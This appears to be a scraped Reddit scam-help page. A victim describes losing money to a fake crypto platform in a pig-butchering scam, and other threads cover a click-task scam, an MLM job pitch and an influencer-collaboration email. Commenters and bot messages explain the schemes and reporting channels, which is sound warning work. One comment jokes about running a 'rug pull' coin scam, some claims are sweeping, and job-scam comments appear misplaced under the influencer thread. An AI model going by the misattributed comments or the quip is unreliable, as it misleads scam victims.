- I'll bet you five bucks I can tell you where you got your shoes.

Title: I believe I invested in a Cryptocurrency Scam
Body: Beginning of December I invested in cryptocurrency on btseus.net under the guidance of a woman I met through text messages. She thought I was someone else at first and I thought she was a former coworker. She did not talk about cryptocurrency initially, though she did mention she mentioned she saved her business through it during the pandemic. It was about two weeks before she invited me to invest and I got suspicious. She quickly sent a picture of her driver‚Äôs license to prove her legitimacy. I checked out the license and couldn‚Äôt find anything wrong with it. So I went ahead and invested in btseus.net. I started with $500 and then eventually invested another $5000. She even gifted me $25,000 so that I could make $100,000. When I went to withdrawal I was met with a tax email, which I took out a loan to. After paying I then received this email and am not sure if I will be able to withdraw my funds and that I will likely keep receiving more emails like this. I then noticed that the email is also coming from a gmail account. Has anyone else encountered this? What can I do to recover my funds and stop my scammer?

- Yes, it‚Äôs a scam. No legitimate brokerage is going to have you send money to a random account to verify who you are.
- You were scammed, your money is gone. Anyone who tells you they can get it back is a SCAMMER
- This is a really standard wrong number pig butchering scam
- I'm sorry, but you're talking to a scammer and the platform is fake. The domain was only made in Nov 2024, made to make you think you've gained funds. "She" and the scammers control the site, so it's made to seem like she "lent" you the funds.

Domain: btseus .net

Registrar: Tucows Domains Inc.

Registered On: 2024-11-08

https://www.whois.com/whois/btseus.net

!crypto (this type with the fake girl is known as the !pig butchering scam)

Edit:  Please IGNORE any messages you get claiming that they or they know someone that can help get your funds back, because they can not. They are recovery scammers, hoping to scam victims who have lost money.

You can report the scam to the government here (if you're in the us)  [https://reportfraud.ftc.gov](https://reportfraud.ftc.gov)

Please understand that since the funds were given via crypto to scammers overseas, the chance of recovering said funds are pretty much impossible.
- >under guidance of a woman I met through text messages

Case closed, it's a scam. Like seriously why tf do y'all fall for this crap
- Sorry OP but it never astounds me how often people trust other people who they have never actually met.

It doesn't even sound difficult to fabricate a driver's license from somewhere or to AI some photos these days. The bottom line is, no stranger wants to put money in your pocket over their own...
- Yes. It‚Äôs a scam, and a common one.

Sorry, all your money is with the scammers and now they are trying to get more via fees. There is no money invested, you have no money in an account. The trading platform is fake and just shows fake amounts to look like you are making money .. the $25k gift was fake as well.
- The only people that will send you a picture of a driver's license are scammers. It doesn't prove anything. The woman in the photo is actually the victim of another scam, someone who sent that photo to the scammers when they asked for it.

Most of these scams are run by groups in southeast Asia or Africa. Countries like Myanmar have compounds where scammers live and work. The corrupt governments of those countries get paid by the scammers, so their law enforcement has no intention to prosecute them. And they are beyond the reach of the police in your country.

You got out before you lost more money, so that's good. People lose thousands to these scams, some people lose their entire savings, car, house, money borrowed from relatives. So you learned a lesson, it cost you, but  hopefully it's not a lot of money for you.

But:  if you're going to trade, or invest, you need to educate yourself so you don't fall for anther scam. 

Some random person telling you that she's rich and will help you get rich is lying. Some guru on Instagram or other social media who claims to have a guaranteed plan to make money is lying. Ponzi scam, fake trading platform, pump and dump stocks, whatever they're doing, they're trying to scam you and take as much of your money as they can.
- Just the first sentence, it is already a scam.
- Your money is gone and nobody can get it back. Watch out for !recovery scammers in your DMs
- The initial contact was part of the scam. They'll send a general message like "hey I'll be late" or "tell Randy I have a new phone number" as a way to find out if the phone number is active. Then it's general conversation until the scam hits. I think it's called pig butchering.
- Yup; there was no investment. Your money is gone and cannot be recovered.

# BEWARE!

You will be getting DM‚Äôs from people who say they ‚Äúknow a hacker on Telegram who can recover your money‚Äù. These are ‚Äú!recovery scammers‚Äù and they are trying to steal from you
- !pigbutchering
- Exactly the same kind of scam I became a victim of. Do not put another cent into the account, because at this point the .003% will turn out to be quite a lot more of good money chasing after a very bad one. Forget it. Report it to the authorities in your jurisdiction if only just to add to the database of those fighting these crimes.  Sorry this happened to you just as it happened to me. 

Were there a lot of gifs exchanged between you and the scammer??  This is just for my personal information.
- How did sending you a (fake) driver‚Äôs license prove her legitimacy?
- How much money did you put in? Not the account ‚Äúvalue‚Äù, just out of pocket.
- OP you have a very good attitude about this. It could have been much worse. You paid the equivalent of 1 year of University in my country. Not too bad for a very potent lesson in the end.
- Yup, you have been scammed and the money is gone. Paying any fees, taxes, penalties (no matter what that call them) will go to the same crooks. And it will only lead to more money you have to pay. Just cut your losses now.

‚ÄòShe thought I was ‚Ä¶‚Äô. Read this site, extremely common story.
- I mean, what are we even supposed to say at this point? This is the textbook version of the crypto scam a.k.a. pig butchering.
- All cryptocurrency is a scam. If you aren't getting scammed, you are the one scamming.
- Correct all of this was a scam start to finish. You have no more money and they're all gone. Likely any of the "gifted" money was just smoke and mirrors to get you to believe it. 

The only people who could potentially help you are your local FBI or the actual FBI cyber crimes
- Don't fall for the incoming recovery scammer!
!recovery
- There is no such thing as "approving" your withdrawal request. If you can't withdraw freely, the crypto isn't yours. This is straight up an advance fee fraud.

There is nothing you can do to recover your money. None of the claimed profits are real. The claimed payment of $25000 so you could make $100000 was fake numbers on a screen. It was a scam all along. Everything about this is fake and the money's gone forever. Anyone saying they can recover your crypto is a scammer trying to get you to pay them more.
- The police won't be able to help you. Anybody who says they can help you is a recovery scammer. I'm not sure you understand that your money is 100% irrecoverable.  I expect you are in a state of shock and disbelief and denial right now but false hope is not helpful in the long run. You will never get your money back.
- "New York time" is not how time zones are referred to in real life. Just one of the many scam-signs here.
- Beware of !recovery scammers
- Of course it‚Äôs a scam.
- Nobody ever, especially a stranger, is EVER going to gift you $25,000 for any reason.
- 100% a scam, you money is gone unfortunately.
- Yes it‚Äôs a scam.  Don‚Äôt send them anymore money.  Your earnings don‚Äôt exist.
- Scam. Your money is gone.
- Let's remove the word invest from this,  you were scammed and that money gone.
- OP mentions not being concerned about being scammed due to still having "enough funds to secure my loans". Op, are you saying you are going to take out loans that require a payment from you first?
- Literally anything to do with "crypto investment" is highly likely to be a scam.
- This is a common scam. You got into something you had no idea about all in the name of free money. There is no magic stranger that will come into anyone‚Äôs life and make them rich. Unfortunately you have joined the thousands that have lost money to scammers in an attempt to retire early.  Good luck. Watch out for recovery scammers.
- 1. Cryptocurrency is already a scam.

2. This is a classic "pig-butchering" scam. They start by pretending it's a wrong number, and then build confidence over weeks. It's a really nefarious long con. The domain you were using to buy crypto was fake. You were just sending all that money straight to the scammer. This email is an attempt to squeeze one last bit of cash from you. You cannot withdraw the money. It's all gone. There never was any crypto.
- "Scam" is just a shorter spelling of cryptocurrency.
- My friend this is a classic scam. Money is gone. Don‚Äôt give them any more. I‚Äôm sorry.
- Yeah. You did. Sorry.
- I knew from the first line it was a scam. All your money is gone and nobody messaging you on here after this can actually recover it. Block the number and figure out how to recover from here going forward.
- Wow, that email is quite a ride.
- the !crypto bot has some good info. yes, 100% a scam‚Ä¶
- I know someone that was in this exact scenario to a T. Def a scam! 

Woman messaged him "on accident" and didn't initially talk about money. But then eventually told my friend about this crypto exchange and he put money on it. He trusted her cause she talked about her business she owned selling jewelry in Canada. He eventually got the exact same email regarding tax. I did a reverse image search on the pictures of herself that she sent and they all connected to fake Facebook bot accounts.
- You'll need to provide a bit more detail. 

BTSE is "real enough", but their website never said anything about needing to put down a deposit to do international withdrawals. 

https://support.btse.com/en/support/solutions/articles/43000588188-deposit-withdrawal-send-fees-and-limits-fiat-crypto-currencies-

There are some withdrawal fees, but it's like 0.1% through SWIFT to your bank account. FCA is real... in UK, as BTSE is a BVI Corporation and technically under FCA jurisdiction. 

I recommend you send that email to BTSE to confirm its bonafides.
- [removed]
- Agreed, it was a scam.
- You have been scammed. Very  similar to the scam that I encountered. They require you to invest/pay money in, then they tell you your money is ‚Äúlocked‚Äù and the only way to access it is to ‚Äúinvest‚Äù or pay in more money. The scammer will offer to ‚Äúloan‚Äù you part of the funds required to unlock your money so that you can access it. They said they are willing to lend you this money because they know you‚Äôre gonna get it right back. When you do pay in that money, another issue arises, which requires you to pay more money in order to unlock your funds. Again, this scammer presenting themselves as wanting to help you will offer to loan you the money for part of the funds required to ‚Äúunlock‚Äú your money. They do this because they know that there is no investment, there is no requirement to unlock your funds. Those funds are gone. Any funds you pay to access those funds are gone. The money that they offered to loan you as partial payment for these payments Are totally fictional. The claims that they are in the same position as you and that they have been working successfully for the company are lies. They will continue to entice you to put in more money until you finally figure out or are told that you have been scammed. All the money that you have put into this scam is gone and you will never recover it. I know this because it happened to me. Thank God, not to the tune of $100,000, but enough to hurt me financially and caused me severe depression and anxiety. DO NOT GIVE THESE PEOPLE ONE MORE PENNY OF YOUR MONEY!! everything, every word every promise every loan every part of this was a lie to separate you from your money. I‚Äôm so sorry. Stop now and cut your losses.
- And don‚Äôt fall for the scam of recovering your money. The very same people will call you back to tell you that they either can recover your money or that they already have your money. Again, they will tell you that you need to pay in an amount of money in order to access the funds you have lost. Every time you pay in there will be some hitch that will require you to pay in more.
- I don't want to be rude but I have skimmed your post history u/Baercub  and you seem pretty involved in gaming?  You probably need to learn about the real world facts of investing before you fall into another situation.  While it's nice you have the ability to get out of this situation, the next time might not end so well.  Pleaseeee get a reality check by taking a "basics of investing" course with a reputable provider such as a college extention course or through your library or maybe Great Courses. Spend time in this sub too.  Although there are new investments opportunities all the time, the fundamentals don't really change and that is what you need to become more familiar with.  Good luck!
- My friend got scammed via a similar means up to $500k. Please be wary üòü
 It's a scam
- I actually ran into like three scammers from the  BTSEUS scam site in real life, they are going to Pittsburgh University in Pittsburgh,PA.
I know it was them because they got me and some of the pictures she(the scammers) sent me match one of the two girls and one guy in the party at a local amusement park, they mentioned the site and freaked out then ran lol.
But yeah it‚Äôs actually a scam
- Thank you I will be speaking with the police tomorrow ‚ò∫Ô∏è

- How?
- Hi /u/vitaminxzy, AutoModerator has been summoned to explain the Fake crypto wallet scam.

Fake cryptocurrency websites and apps controlled by scammers are becoming more and more common. Sometimes the scam begins with a romance scammer who claims that they can help the victim invest in cryptocurrency. Victims are told to buy cryptocurrency of some kind using a legitimate cryptocurrency exchange, and then they are told to send their cryptocurrency to a website wallet address where it will be invested. Sometimes the scam begins with a notice that the victim won cryptocurrency on some website, in this case messages will often be sent through Discord.

In either case, the scammer controls the website, so they make it look like there is money in the victim‚Äôs account on their website. Then the scammer (or the scammer pretending to be someone official who is associated with the website) tells the victim that they have to put more money into the website before they can get their money out of the website. Of course all of the money sent by the victim has gone directly into the scammer‚Äôs wallet, and any additional money sent by the victim to retrieve their money from the website will also go directly into the scammer‚Äôs wallet, and all of the information about money being held by the website was totally fake.

If the scammer used Bitcoin, then you can report the scammer‚Äôs Bitcoin wallet address here: https://www.bitcoinabuse.com/reports. If the scammer used Ethereum, then you can report the scammer‚Äôs Ethereum wallet address here: https://info.etherscan.com/report-address/. You can see how much cryptocurrency has been sent to the scammer‚Äôs wallet address here: https://www.blockchain.com/explorer. Thanks to redditor nimble2 for this script.

- Hi /u/vitaminxzy, AutoModerator has been summoned to explain the Pig butchering scam.

It is called [pig butchering](https://www.forbes.com/sites/jasonbrett/2023/12/26/new-pig-butchering-crypto-scam-includes-victims-in-us-and-overseas/?sh=2837fb975eaa) because scammers use intricate scripts to \"fatten up\" the victim (gaining their trust over days, weeks or months) before the \"slaughter\" (taking them for all of their money). This scam often starts with what appears to be a harmless wrong number text or message. When the victim responds to say it is the wrong number, the scammer tries to start a friendship with the victim. These conversations can be platonic or romantic in nature, but they all have the same goal- to gain the trust of the victim in order to get them ready for the crypto scam they have planned.

The scammer often claims to be wealthy and/or to have a wealthy family member who got wealthy investing, often in crypto currency. The victim is eventually encouraged to try out a (fake) crypto currency investment website, which will appear to show that they are earning a lot of money on their initial investment. The scammer may even encourage the victim to attempt a withdrawal that does go through, further convincing the victim that everything is legit. The victim is then pressured to invest significantly more money, even their entire net worth. Sometimes pig butchering scams don't involve crypto, but other means of sending money (like bank wires, gift cards or even cash pickups).

Eventually, the scammer will find an excuse why the account is frozen (e.g. for fraud, because supposed taxes are owed, etc) and may try to further extort the victim to give them even more money in order to gain access to the funds. By this time, the victim will never gain access and their money is gone. Many victims lose tens of thousands, hundreds of thousands, or even millions of dollars. Often, the scammers themselves are [victims of human trafficking](https://www.vice.com/en/article/n7zb5d/pig-butchering-scam-cambodia-trafficking), performing these scams under threats of violence. If you are caught up in this scam, it is important that you do not send any more money for any reason, and contact law enforcement to report it. Thanks to user Mediocre_Airport_576 for this script.

If you know someone involved in a pig butchering scam, sit down together to watch this video by Jim Browning to help them understand what's going on: https://youtu.be/vu-Y1h9rTUs -

- You know you can !whois btseus.net
- This is where I stopped reading lol‚Ä¶
- I only take guidance from wrong number texts from verifiably fat, slobby men. Never has steered me wrong.
- tbh the "case close" fits also when you see "cryptocurrency".
- Shit, i don't trust people i have met. I had a roommate who kept getting suckered into MLMs, and losing tons of money every time. She finally learned after like the 4th different one.
- the thing is what stranger will be so keen to get another person to invest into something that they will provide their own driver licence, Red flags top to bottom, red flag every step of the way.
- Lesson learned.
- It never FAILS to astound you?
- Thank goodness for that. It‚Äôs funny because I‚Äôm relieved. I just hope this a lesson for some else to learn.
- Yes and it was lesson well learned. I lost money, but I didn‚Äôt put my self in irrevocable debt. Beside I still have half the loan I took out and will be able to pay it off quickly.
- Hi /u/Hear-that-sound, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members.

- Hi /u/erishun, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

- Hi /u/hevermind, AutoModerator has been summoned to explain the Pig butchering scam.

It is called [pig butchering](https://www.forbes.com/sites/jasonbrett/2023/12/26/new-pig-butchering-crypto-scam-includes-victims-in-us-and-overseas/?sh=2837fb975eaa) because scammers use intricate scripts to \"fatten up\" the victim (gaining their trust over days, weeks or months) before the \"slaughter\" (taking them for all of their money). This scam often starts with what appears to be a harmless wrong number text or message. When the victim responds to say it is the wrong number, the scammer tries to start a friendship with the victim. These conversations can be platonic or romantic in nature, but they all have the same goal- to gain the trust of the victim in order to get them ready for the crypto scam they have planned.

The scammer often claims to be wealthy and/or to have a wealthy family member who got wealthy investing, often in crypto currency. The victim is eventually encouraged to try out a (fake) crypto currency investment website, which will appear to show that they are earning a lot of money on their initial investment. The scammer may even encourage the victim to attempt a withdrawal that does go through, further convincing the victim that everything is legit. The victim is then pressured to invest significantly more money, even their entire net worth. Sometimes pig butchering scams don't involve crypto, but other means of sending money (like bank wires, gift cards or even cash pickups).

Eventually, the scammer will find an excuse why the account is frozen (e.g. for fraud, because supposed taxes are owed, etc) and may try to further extort the victim to give them even more money in order to gain access to the funds. By this time, the victim will never gain access and their money is gone. Many victims lose tens of thousands, hundreds of thousands, or even millions of dollars. Often, the scammers themselves are [victims of human trafficking](https://www.vice.com/en/article/n7zb5d/pig-butchering-scam-cambodia-trafficking), performing these scams under threats of violence. If you are caught up in this scam, it is important that you do not send any more money for any reason, and contact law enforcement to report it. Thanks to user Mediocre_Airport_576 for this script.

- Hi /u/vikicrays, AutoModerator has been summoned to explain the Fake crypto wallet scam.

Fake cryptocurrency websites and apps controlled by scammers are becoming more and more common. Sometimes the scam begins with a romance scammer who claims that they can help the victim invest in cryptocurrency. Victims are told to buy cryptocurrency of some kind using a legitimate cryptocurrency exchange, and then they are told to send their cryptocurrency to a website wallet address where it will be invested. Sometimes the scam begins with a notice that the victim won cryptocurrency on some website, in this case messages will often be sent through Discord.

In either case, the scammer controls the website, so they make it look like there is money in the victim‚Äôs account on their website. Then the scammer (or the scammer pretending to be someone official who is associated with the website) tells the victim that they have to put more money into the website before they can get their money out of the website. Of course all of the money sent by the victim has gone directly into the scammer‚Äôs wallet, and any additional money sent by the victim to retrieve their money from the website will also go directly into the scammer‚Äôs wallet, and all of the information about money being held by the website was totally fake.

If the scammer used Bitcoin, then you can report the scammer‚Äôs Bitcoin wallet address here: https://www.bitcoinabuse.com/reports. If the scammer used Ethereum, then you can report the scammer‚Äôs Ethereum wallet address here: https://info.etherscan.com/report-address/. You can see how much cryptocurrency has been sent to the scammer‚Äôs wallet address here: https://www.blockchain.com/explorer. Thanks to redditor nimble2 for this script.

- **This submission was manually removed because it was posted by a recovery scammer.**

Don't trust what you just read, don't try to reach out to "hackers" on Instagram or Telegram. Scammers will also try to reach out to you via DMs saying they know a professional hacker that can help you, for a small fee. They're actually trying to steal your money.

You can help us reporting more messages like that, don't just downvote or insult them. If you report them, we will take care of every recovery scammer that pops up.

**Remember: Never take advice in private,** because we can't look out for you. If you take advice in private, you're on your own.
- Oh holy heck. I am so sorry.
- Yea that was the interesting thing with my scam was the hundreds of pictures and I reverse image searched them, but didn‚Äôt get any results.
- That won't do any good, but go through the process and then let it drop (because the police can't hack their way through the encryption and virtual private networks that all of the contact you've made with the scammers has gone through). Spend some time reading this sub because you fell for an old and now classic scam. So you should become familiar with online scams in general to protect yourself in the future.
- There's no point.¬† These guys are in India or China, you're money is gone.¬† Stop talking to strangers.¬† Don't take investment advice from strangers.¬† Don't invest in things that have utterly unrealistic returns.


Your money is gone.¬† Block these people and tell your friends how not to get scammed.
- There is no such thing as the ‚ÄúFinancial Conduct Authority‚Äù in the US. It‚Äôs exclusively a UK entity.  

You should certainly report this to law enforcement. IC3 is probably the best avenue, but local law enforcement as well won‚Äôt hurt. 

Please be aware: your money is almost certainly gone. You did not invest in anything. You sent money to criminals, and everything you saw about investments and profits was fake. Generated just to convince you that the platform was legitimate. 

The ONLY people that can recover your money are the government/law enforcement. They will not charge you anything to do it. It‚Äôs virtually guaranteed that you will be contacted by recovery scammers posing as hackers, law firms, and even law enforcement that will tell you they can recover your money if you pay them. IGNORE THESE PEOPLE. 

Do not engage with anyone who contacts you. Even if you get a phone call from an entity you‚Äôve previously contacted, hang up on them and call back via a number you know to be authentic. 

It‚Äôs sucks, but the best thing for both your mental health and financial security is to come to terms with the fact that this money is gone. Chasing after it will almost certainly lead to you losing even more money. 

Contact IC3 via the information on their website. Contact your local law enforcement in person. Make sure that ALL future communication with any of these people is via numbers and email addresses that you can verify as being legitimate.
- Say goodbye to your money forever, you're never gonna recover that money you lost in this scam.
- Best of luck, even though the comments are being overwhelmingly negative, it's really the only way you will have the slimmest chance of ever seeing your money again. That said, make your peace with the fact that the money is most likely gone.
- >I will be speaking with the police tomorrow.

I can‚Äôt stop laughing.
- The police can‚Äôt help you.

**This domain name was created ONLY 73 DAYS AGO!!** and it was only registered for a single year (Expires: Nov 2025).

- yeh maybe it's just by habit lol
- At least OP didn't "invest" in the Hawk Tua coin!

(or maybe he did. they never mentioned which one. could've been the Trump Pump & Dump)
- This. I could not convince my own brother to invest in NVIDIA stocks over a year ago. I told him to make an account with Charles Schwab and that I would guide him. He said, no thanks. I am baffled how a wrong number text can lead to an investment opportunity. I love my cash too much to give it to a random stagger.
- That's the positive to take from it. Save yourself and possibly somebody else in the future.
- Yes it is a scam.
All crypto is a scam.


Please read this sub a couples times per week.¬†


Be aware

¬†Now that the scammers have you on their list of scammable people they will keep contacting you from new and different angles
- Yep
- And just ignore anyone that says they can recover it, they are scammers too.

You have a good attitude to get over it.

Can I ask how much you put in and how much did the scammers say your account was worth.
- If you ever decide to try to invest in cryptocurrency in the future, make sure to google the website to make sure it is legit. And once you have invested money, don‚Äôt click random links that people send you. Anything that sounds too good to be true, oftentimes is. If you ever start trading and you see a small balance randomly added to your account from an outside source.. don‚Äôt click on it or try to do anything with it.. just ignore it. I started trading toward the end of ‚Äò21 and love it.. but you gotta be careful and mindful that there are hackers all over that will do whatever they can to take from others. Praying for you üôèüèΩ
- The photos were all stolen from social media. You were talking to a man.
- You can but you can't rely on people who promise you that moon you have to find the vehicle through legitimate means. 

As in, Donald Trump is clearly fucking with crypto right now so if you use a legitimate exchange and bought crypto which is legitimate it would shift based on the market itself. 

If someone says: hey buy this Trump coin it is going to shift, you run as far away as you can. 

It only works if you utilize legitimate and regulated means... Or if you become the wolf/shark yourself. ü§∑‚Äç‚ôÇÔ∏è

You can make you own coin with 15k and do your own rug pull scam with that much money people have done it with less.
- So far you're the only one with this positive attitude even after getting scammed.

Your loss is not detrimental but is still a significant amount for many out there.

Hope you learnt from this expensive lesson and NEVER EVER trust anyone from the internet/online.
- Police likely can't help, but please file an ic3.gov report. This is how the FBI keeps track of which scams are circulating. It is very unlikely that you will recover any funds, but not impossible. Here's a [link that explains what filing an ic3 does.](https://www.ic3.gov/PSA/2022/PSA221003)
- Common expression, sure. Used in formal financial documents, no.
- If you want them to go through the process don‚Äôt tell them it won‚Äôt do any good.
- With a smiley at the end of this sentence.

Can't help but feel bad for him, yet feels funny at the same time.
- The police will take the next plane to Asia. üòÇ

You're probably better off asking Donald Trump to do something about China.
- Actually yeah you're right, I skipped the part where OP "invested" in a platform that a random message told them about.

I thought they found the platform themselves.

- Exactly I‚Äôm not mad about the situation I shouldn‚Äôt have been so trusting, and honestly I am going to come out on top of this. I have enough funds to secure my loans.
- That like saying all money is a scam but like money is used for all scams pretty much so yeah that's like the majority of crypto use. 

If you're trying to use it to buy something in a system like vbucks then it is what it is but don't go try leveraging vbucks to make big on your investment.
- $17,000 ($5000 my own and $12,000 from a loan) and it looked like my account was worth $100,000. I still have the other half of the loan I took out and will be able to pay it off rather quickly.
- For real, and who knows? They just might be the luckiest MF to ever get scammed and get some bored Sherlock Holmes type who doesn‚Äôt go by the rules and has a chip on his shoulder? You just can‚Äôt be sure‚Ä¶.
- More money than intelligence üòµ‚Äçüí´

You need a financial advisor bud.
- Have you found any information out or reported the situation yet? Sorry for what you lost. That sucks. And has the scammed tried contacting you again? Or calling you from a different number? Or emails?
- Thanks for that, I was just interested to see how wild they made the %increase to be . So they were making out you were getting like towards a 500% increase.
- Working on reporting it to proper channels today. Blocked the scammer and haven‚Äôt gotten any other messages/calls/emails.
- Don't forget the generous $25,000 support from the online friend/investment guru to make it $100,000.
- to be fair who wouldn't gift their online friend met 2 week prior 25k so they can hit 100k on their crypto account
- Were you actually tracking the investments? Did you look at what was bought that went up so quickly ?

Title: Pearl Lemon "Click on Advertising" Scheme
Body: Has anybody heard of the scammers who use Pearl Lemon as a scheme to get people to click on adverts to increase the advertising companies' SEO score?  You get paid in USDT, but in the end they make you pay them to get your funds released.  And if you can't pay for the "negative" that the Joint Marketing causes, then you're screwed.  They keep it.  Side revenue perhaps while increasing client SEO?   Why does it persist?

- !task scam

Mindlessly clicking at meaningless fake things doesn't make anyone any money.
- Why does it persist, that is an excellent question.

Because people are ignorant, gullible, and greedy.

- Ignorant: don't understand how jobs work
- Gullible: believe the made-up convoluted things the scammers tell them
- Greedy: want money, think that there's an easy way to make lots of money

Because people, especially ages 15-25, watch videos of influencers posing next to a Lamborghini and claiming that it's theirs, purchased after making millions with ecommerce or crypto.
- Hi /u/seedless0, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

Title: Need help, I recently got an offer from Newport AND Associates
Body: I found the job offer on LinkedIn and what I found weird was that the company was very similar to Newport on glassdoor but on the company website, they didn't have job opportunities available. I received a zoom link to attend a meeting, no interview or anything. Attending a zoom meeting with what seems many people in the seminar where the lady is showing a slideshow of how the company works and throwing commission/wholesale rates and I'm starting to get lost. It's a remote full time offer  and they claim to be in business for 70 years. I don't know if this is legit.

- This sounds like some MLM thing.
- Smells like MLM. Especially the part about skipping an interview and jumping right into a seminar. I'd ghost them.
- Someone else just posted in here about an MLM travel scam.
- Update: the company is affiliated on myEvolution travel and I would have my own website link, and they are providing packages to set up for certifications and coventions. Interesting.
- If by interesting you mean gigantic scam then yes.
- I said interesting, as in more doubt and sarcasm. I was on the edge, but with the comments, it has confirmed my suspicion, and I blocked them.

Title: Is this a Scam/MLM? Daisy Ann Beauty collaboration email
Body: I received an email this morning from someone claiming to be the Director of Collaborations from a company called Daisy Ann Beauty, based in New York, saying they found my social media posts and thinks I value nature and beauty. I do post nature photos on my socials but I barely have 3,500 followers across TikTok, Insta, and a few smaller apps and they did not specify which one they found me at. Furthermore they asked to send me some free items like haircare and oil sprays in hopes of possibly collaborating and sponsoring my social media.  

There's not a lot I found about the company online but the lack of information on the web is both concerning and I can't make my own decision on if I want to even entertain the email. They have a storefront and that's about it, no socials and anything else, there's not even a scam or MLM report I could find.

I'm like 75% certain this is a pyramid scheme or worse but just wanted to confirm before I go any further with this.

- /u/BloggerZen - Your post has been queued for moderation because our bot detected a low effort title. **Be patient until it's reviewed by a moderator.** While you wait, we suggest you thoroughly read the following guideline: [How to submit a good post to r/scams](https://www.reddit.com/r/Scams/comments/1fw44zb/guide_how_to_submit_a_good_post_to_rscams/), where we describe what a good title is for us.

As you can see in that guideline, we want posts to have a good title because Google loves Reddit. This post may be about you asking for help, it may also be you warning you about a new scam. Whatever the case may be, this post will help hundreds of other people if it's searchable. We want to make sure your title summarizes the scam being described.

If you agree that your post doesn't have a good title, delete the post yourself, and post again. If this post is about a scam website (or a potential scam website), make sure your new post contains the website address in the title (not in the post). Unfortunately post titles aren't editable, so you'll have to post again if that's the case.

- !influencer scam. Not worth the effort.
- Got it also just now and I‚Äôm absolutely nobody on Instagram ü§£
- Just got the email as well ü´†
- I got the email last week, I asked for more info and they offered to send me their dyson air wrap dupe. The way they explained the "campaign" is more like an ambassadorship/affiliate program where you post and get commission when someone buys using your code. Seems scammy though...
- I got one of those emails too! It seemed odd to me because they don‚Äôt have much of a web presence, and I barely have followers. Be careful, this could be a scam.
- I got the same email today.
- I got the email last week too. The formatting was weird; the subject line said Emily, whereas the signature is from Sara. I can't find info on either one. It seems fishy to me.
- Got the same email and barely have 1k followers haha
- yes! its a scam!!
- I got the email yesterday, glad I looked this house. They did seem kind of sus to me
- Hi /u/ky0877, AutoModerator has been summoned to explain the Influencer scam.

This is a dishonest marketing technique where a user will reach out to you on a social media platform, usually Instagram, and offer you the chance to work with or promote a brand. Sometimes the main brand account will reach out to you, but other times a fresh account will message you and direct you to contact the main account. Working with the brand will involve buying their products, though you may be offered a discount.

This technique is usually used by dropshipping sites that sell items from Aliexpress at inflated prices, so even with the discount they will make money from your order. This is simply a marketing technique sent to many people at once to get people to order from their site, so if you receive a message like this all you need to do is ignore it.

- /u/Heyo13579 - Your post has been queued for moderation because it looks like you included a clickable link. Reddit Admins will remove posts to dangerous websites, so we have to look out for one another.

## The safe way to post about scam websites is:

* Write the website address in the title of your post
* Don't post clickable links in the body text

## So:

* If your post already has a website address in the title: edit the body of your post to remove the clickable link. For example, you can replace a .com with (dot)com - then wait until a moderator comes to take a look and approve this.
* If you didn't put the website address in the title: since titles aren't editable, we encourage you to delete this post, and post again - this time, writing the website in the title of your new post.
* If this post is NOT about a possible scam website: for example, if you tried to share a news article, or a government website, etc - just wait until a moderator comes to take a look and approve this.

- Definiely going to be a type of !job scam. No remote job pays that well for entry level. or requires you to continue any convo over social media apps. They also offer sooooo many insanely good benefits to blind you to the fact it is a scam.
- "Signal Messenger"

"You are required to contact the Hiring Manager"

Two things no legit recruiter has ever said to a candidate
- Unless you have significant experience and desirable skills, such as decades as a software engineer or something, 100% of remote jobs in 2025 will be scams.
- I literally just got the same e-mail from the same job after applying on indeed.
- WFH call center / customer support jobs do exist, based on what others have posted on this sub.

But this seems like a scam, for the reasons you point out. Maybe the are pretending to be from the printing house. Did you look at the website for the company, to see if they have job listings? If they don't have a website with info about the company (location, names of top management, description of their business), that's another red flag.
- The URL gogreenblockchain(dot)com was just registered in November 2024 and only for 1 year.  Definite sign of a scam.
- I just got this email today too. I'm looking it up online and decided to see what reddit said about it. Website looks vague. Why do I have to download a separate app to request an interview? I applied for a different company and I'm being redwerwd to this one, all seemed fishy. 

I hate scammers, so much!
- I did it as well I am waiting for my check tomorrow they will send me a tracking number I will let you know if this is a scam

- Omg!!! I got the same email and was in contact with the same individual. I had a feeling it was sketchy from the interview via text! Not to mention the dozens of grammatical errors. They insisted on me printing a check for the supplies, and that's when the alarm really kicked off. You can't print a check on regular paper!!!! I'm so glad I came to Reddit and found these posts before I continued. I'll definitely be cutting off all contact with them!!! Absolutely ridiculous! People, be safe and be wise!
